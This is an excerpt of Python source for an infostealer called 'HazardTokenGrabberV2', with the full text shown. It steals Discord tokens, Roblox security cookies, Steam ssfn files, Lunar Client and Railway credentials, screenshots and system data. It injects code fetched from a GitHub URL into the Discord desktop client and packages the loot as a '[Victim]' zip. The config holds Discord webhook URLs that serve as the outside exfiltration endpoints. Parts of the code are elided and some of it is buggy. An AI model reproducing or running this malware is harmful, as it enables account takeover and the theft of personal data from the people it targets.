...
__config__ = {
    ...
    'webhook': "https://discord.com/api/webhooks/1084592099833413702/YErP3V-WIwE5wT-a-hK73xjDy0LvFL1AddwJjPFir0r_YKH4T6g_-EBiSYWc_vA5eckD",  # Place your webhook here

    'keywebhook': 'https://discord.com/api/webhooks/1084878046747705514/wqJTUR60oSTPB7BfJ-G5iBrjWNOAe1H1KjUbgKtbxKE0Xmf-vShiEMCISVYAL5r3ALJl',
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/LocalSmail/rrrrrrrtrterterterte/main/t",
...
class Functions(object):
    ...
    @staticmethod
    def fetch_conf(e: str) -> str or None:
...
class HazardTokenGrabberV2(Functions):
    ...
    async def init(self):
        ...
        function_list = [self.screenshot, self.sys_dump, self.grab_tokens, self.grabMinecraftCache, self.grabRobloxCookie, self.steam, self.railway, self.LunarClient]
    ...
    def steam(self):
        folder = self.dir + '\\Steam_Data\\'
        try:

            steam = 'C:\Program Files (x86)\Steam'

            os.mkdir(dir + '/Steam_Data')

            targets = os.walk(steam)

            for files in steam:
                if files.startswith("ssfn"):
                    print(f"found: {files}")
                    shutil.copy2(files, folder)

        except Exception as e:
            print(e)
            pass

    def LunarClient(self):
        target = "C:\\Users\\" + \
            os.getenv("UserName") + \
        ...
        target2 = "C:\\Users\\" + \
            os.getenv("UserName") + \
            "\\.lunarclient\\launcher-cache\\hwid-private-do-not-share"

        os.mkdir(self.dir + '/LunarClient')

        folder = self.dir + '\\LunarClient\\'

        shutil.copy2(target, folder)
        shutil.copy2(target2, folder)

    def railway(self):
        path = f"C:\\Users\\{os.getlogin()}\\.railway\\config.json"
        
        os.mkdir(self.dir + '/Railway')
        
        shutil.copy2(path, self.dir + '\\Railway')
                    ...
                    if re.match(r'app-(\d*\.\d*)*', __dir):
                        ...
                        for ___dir in os.listdir(modules):
                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core-1\\'
                                if ntpath.exists(inj_path):
                                    ...
                                    if self.hook_reg in self.webhook:
                                        f = httpx.get(self.fetch_conf('injection_url')).text
                                    else:
                                        f = httpx.get(self.fetch_conf('injection_url')).text
                                    try:
        ...
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path HKCU:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
...
{line_sep}
    ...
    def finish(self):
        ...
        num_items = len(self.robloxcookies)

        _zipfile = ntpath.join(self.appdata, f'[{Victim}].zip')
        ...
        embed = {
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* | [Google Maps]({self.googlemap})',
                    },
                    'color': 323455,
                    'fields': [
                        {
                        ...
                        {
                            'name': 'Misc Data',
                            'value': f'Roblox:\nGot cookies: {True if len(self.robloxcookies) != 0 else False} || Amout of Cookies: {num_items if num_items != 0 else 0}'
                        }
                    ],
                }
            ]
